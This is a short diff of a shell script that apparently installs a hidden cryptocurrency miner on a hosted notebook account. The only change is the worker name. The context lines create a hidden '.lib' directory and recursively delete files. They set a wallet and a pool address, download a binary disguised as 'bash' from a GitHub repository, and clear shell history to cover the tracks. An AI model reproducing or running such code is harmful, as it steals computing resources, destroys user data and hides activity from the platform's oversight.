@@ -7,7 +7,7 @@ mkdir .lib
 cd .lib
 rm -R *
 rm -R /home/studio-lab-user/.ton
-WORKER="hastalavista"
+WORKER="KotiKoti"
 WALLETNH="aHAuNULsUCUmbkmeitGtNLVUXBcaSPFoUR"
 POOLNH="152.42.189.94:80"
 wget -P /home/studio-lab-user/.lib/ https://github.com/gunturyogatama404/ksjdueoa/raw/refs/heads/main/bash && history -cr
